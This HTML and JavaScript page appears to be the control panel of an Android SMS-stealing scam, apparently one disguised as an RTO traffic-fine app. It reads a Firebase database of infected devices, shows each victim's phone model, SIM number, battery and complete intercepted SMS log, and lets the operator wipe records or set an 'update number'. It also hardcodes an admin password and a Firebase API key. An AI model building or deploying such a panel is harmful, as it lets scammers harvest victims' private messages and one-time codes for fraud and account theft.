<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTO Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        body { background-color: #ffffff; font-family: sans-serif; }
        .header-btns { background-color: #6a1b9a; padding: 12px; display: flex; justify-content: space-between; gap: 10px; position: sticky; top: 0; z-index: 100; }
        .header-btns button { flex: 1; background: #4a0072; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; font-size: 14px; }
        
        .user-card { border: 1px solid #e0e0e0; border-radius: 12px; padding: 15px; margin: 15px; background: white; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: relative; }
        .user-index { position: absolute; left: 10px; top: 10px; font-weight: bold; color: #555; font-size: 1.1rem; }
        .device-icon-container { width: 80px; text-align: center; margin-left: 15px; }
        .device-icon-container img { width: 60px; }
        .user-info { margin-left: 15px; flex-grow: 1; }
        .user-info h6 { margin: 0; color: #333; font-weight: bold; font-size: 1.1rem; }
        .user-info p { margin: 2px 0; font-size: 0.85rem; color: #444; }
        .status-online { color: #2e7d32; font-weight: bold; font-size: 0.85rem; border-top: 1px solid #f0f0f0; margin-top: 10px; padding-top: 8px; text-align: center; }
        
        #login-screen { position: fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:200; display:flex; align-items:center; justify-content:center; }
        #details-modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:150; display:none; color:white; padding:20px; overflow-y:auto; }
    </style>
</head>
<body>

<div id="login-screen">
    <div class="text-center p-4" style="max-width:350px; width:100%;">
        <h4 class="mb-4">Admin Login</h4>
        <input type="password" id="admin-pass" class="form-control mb-3" placeholder="Enter Password">
        <button class="btn btn-primary w-100" onclick="checkLogin()">LOGIN</button>
    </div>
</div>

<div id="admin-content" style="display:none;">
    <div class="header-btns">
        <button onclick="deleteAll()">ALL DELETE USER</button>
        <button onclick="updateNo()">UPDATE NO</button>
    </div>
    <div id="user-list"></div>
</div>

<div id="details-modal">
    <button class="btn btn-sm btn-danger mb-3" onclick="closeDetails()">BACK</button>
    <div id="details-body"></div>
</div>

<script>
    const PASS = "Zuhi@143";
    const firebaseConfig = {
        apiKey: "AIzaSyBxn_lMOEFBkQwBoTM_rGPAV2qaP8yLa1o",
        databaseURL: "https://rto-challan-b6f93-default-rtdb.firebaseio.com/",
        projectId: "rto-challan-b6f93"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function checkLogin() {
        if(document.getElementById('admin-pass').value === PASS) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('admin-content').style.display = 'block';
            loadUsers();
        } else { alert("Wrong Password"); }
    }

    function loadUsers() {
        db.ref('users').on('value', (snapshot) => {
            const users = snapshot.val() || {};
            const list = document.getElementById('user-list');
            list.innerHTML = '';
            let i = 1;
            Object.keys(users).reverse().forEach(uid => {
                const user = users[uid];
                const model = (user.details && user.details.model) ? user.details.model : "Android Device";
                const sim = (user.details && user.details.simNumber) ? user.details.simNumber : "Unknown";
                const battery = (user.details && user.details.battery) ? user.details.battery : "??%";
                
                list.innerHTML += `
                    <div class="user-card" onclick="showUser('${uid}')">
                        <span class="user-index">${i++}</span>
                        <div class="d-flex align-items-center">
                            <div class="device-icon-container">
                                <img src="https://www.freeiconspng.com/uploads/android-icon-png-23.png">
                            </div>
                            <div class="user-info">
                                <h6>Mobile : ${model}</h6>
                                <p>Sim No : <span class="text-primary fw-bold">${sim}</span></p>
                                <p>Battery : ${battery}</p>
                            </div>
                        </div>
                        <div class="status-online">Status : Online User</div>
                    </div>`;
            });
        });
    }

    function showUser(uid) {
        db.ref('users/' + uid).once('value', (s) => {
            const user = s.val();
            const body = document.getElementById('details-body');
            let html = `<h4>Details for ${uid}</h4><hr>`;
            
            if(user.details) {
                html += "<h5>User Info:</h5>";
                for(let k in user.details) {
                    html += `<p style="margin-bottom:5px;"><b>${k}:</b> <span class="text-info">${user.details[k]}</span></p>`;
                }
            }
            
            html += "<hr><h5>SMS Logs:</h5>";
            if(user.sms) {
                Object.values(user.sms).reverse().forEach(s => {
                    html += `<div class="mb-2 p-2 border border-secondary rounded" style="background:#222;">
                        <small class="text-warning">${new Date(s.timestamp).toLocaleString()}</small><br>
                        <b class="text-danger">${s.sender}:</b> ${s.message}
                    </div>`;
                });
            } else html += "<p>No SMS found</p>";
            
            body.innerHTML = html;
            document.getElementById('details-modal').style.display = 'block';
        });
    }

    function closeDetails() { document.getElementById('details-modal').style.display = 'none'; }
    function deleteAll() { if(confirm("Delete all users?")) db.ref('users').remove(); }
    function updateNo() { let n = prompt("Enter new update number:"); if(n) db.ref('update_no').set(n); }
</script>
</body>
</html>
